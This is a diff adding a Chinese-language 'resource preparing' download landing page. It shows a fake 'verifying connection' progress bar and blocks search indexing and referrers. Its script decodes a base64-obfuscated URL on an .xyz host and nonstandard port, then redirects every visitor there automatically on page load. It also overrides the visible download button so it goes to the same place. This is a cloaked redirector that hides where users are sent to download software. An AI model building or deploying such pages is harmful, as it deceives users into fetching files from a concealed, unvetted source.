@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://ggaah2.com/">
+  <title>资源准备中</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      font-family: "Microsoft YaHei", "PingFang SC", Arial, sans-serif;
+      color: #f7fbff;
+      background:
+        linear-gradient(120deg, rgba(94, 87, 255, .16) 0 1px, transparent 1px 120px),
+        linear-gradient(60deg, rgba(45, 224, 255, .14) 0 1px, transparent 1px 120px),
+        linear-gradient(135deg, #07172e, #18235a 48%, #081b35);
+    }
+    .card {
+      width: min(440px, calc(100% - 36px));
+      padding: 34px;
+      border: 1px solid rgba(150, 210, 255, .28);
+      border-radius: 8px;
+      background: rgba(8, 24, 54, .82);
+      box-shadow: 0 24px 70px rgba(0, 0, 0, .35), 0 0 32px rgba(44, 222, 255, .18);
+      text-align: center;
+    }
+    h1 { margin: 0 0 12px; font-size: 28px; letter-spacing: 0; }
+    p { margin: 8px 0; color: #c9d8ff; line-height: 1.8; }
+    .bar {
+      height: 8px;
+      margin: 24px 0;
+      border-radius: 999px;
+      overflow: hidden;
+      background: rgba(255, 255, 255, .12);
+    }
+    .bar span {
+      display: block;
+      height: 100%;
+      width: 0;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #32e6ff, #7a6dff, #ffd15c);
+      box-shadow: 0 0 18px rgba(50, 230, 255, .55);
+      animation: loading 3s linear forwards;
+    }
+    a {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 46px;
+      padding: 0 28px;
+      border-radius: 999px;
+      color: #06142c;
+      font-weight: 700;
+      text-decoration: none;
+      background: linear-gradient(135deg, #5df4ff, #ffd769);
+      box-shadow: 0 0 22px rgba(93, 244, 255, .42);
+      transition: transform .2s ease, box-shadow .2s ease;
+    }
+    a:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(255, 215, 105, .46); }
+    @keyframes loading { to { width: 100%; } }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <div class="bar" aria-hidden="true"><span></span></div>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <a id="manualDownload" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+    const manualDownload = document.getElementById("manualDownload");
+    window.setTimeout(function () {
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }, 3000);
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
